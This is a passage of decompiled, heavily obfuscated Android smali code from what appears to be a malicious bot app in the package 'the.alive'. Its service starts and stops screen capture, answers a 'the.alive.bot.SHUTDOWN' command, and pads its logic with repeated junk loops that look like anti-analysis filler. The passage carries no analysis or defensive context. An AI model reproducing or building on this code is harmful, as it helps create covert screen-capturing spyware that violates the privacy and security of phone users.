    invoke-virtual {p0, p1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto/16 :goto_9

    .line 338
    :cond_a
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_c

    .line 339
    iget-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->resultData:Landroid/content/Intent;

    if-eqz p1, :cond_b

    .line 343
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-direct {p0, p1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->startCapture(Landroid/content/Context;)V

    .line 344
    sput-boolean v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->ISON:Z

    .line 345
    sput-boolean v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->ctd:Z

    .line 346
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->pr()V

    goto/16 :goto_9

    .line 350
    :cond_b
    new-instance p1, Landroid/content/Intent;

    const-class p2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72_SCA;

    invoke-direct {p1, p0, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 p2, 0x800000

    .line 352
    invoke-virtual {p1, p2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 353
    invoke-virtual {p1, p3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 355
    invoke-virtual {p0, p1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_9

    :cond_c
    const-string p2, "the.alive.bot.SHUTDOWN"

    .line 358
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    if-eqz p1, :cond_14

    .line 362
    :try_start_3
    sput-boolean v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->ISON:Z

    .line 363
    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->stopCapture()V

    .line 364
    invoke-virtual {p0, v3}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->stopForeground(Z)V

    .line 365
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->stopSelf()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto/16 :goto_9

    .line 367
    :catch_1
    :try_start_4
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    .line 368
    :goto_5
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_e

    .line 370
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 371
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {p1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_d

    .line 373
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 374
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_5

    .line 380
    :cond_d
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_5

    .line 383
    :cond_e
    :goto_6
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_10

    .line 385
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 386
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {p1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_f

    .line 388
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 389
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_6

    .line 395
    :cond_f
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_6

    .line 398
    :cond_10
    :goto_7
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_12

    .line 400
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 401
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {p1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_11

    .line 403
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 404
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_7

    .line 410
    :cond_11
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_7

    .line 413
    :cond_12
    :goto_8
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_14

    .line 415
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 416
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {p1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_13

    .line 418
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 419
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_8

    .line 425
    :cond_13
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_8

    :catch_2
    move-exception p1

    .line 436
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    :cond_14
    :goto_9
    const/4 p1, 0x2

    return p1
.end method

.method public pr()V
    .locals 2

    .line 475
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;

    invoke-direct {v1, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 570
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method
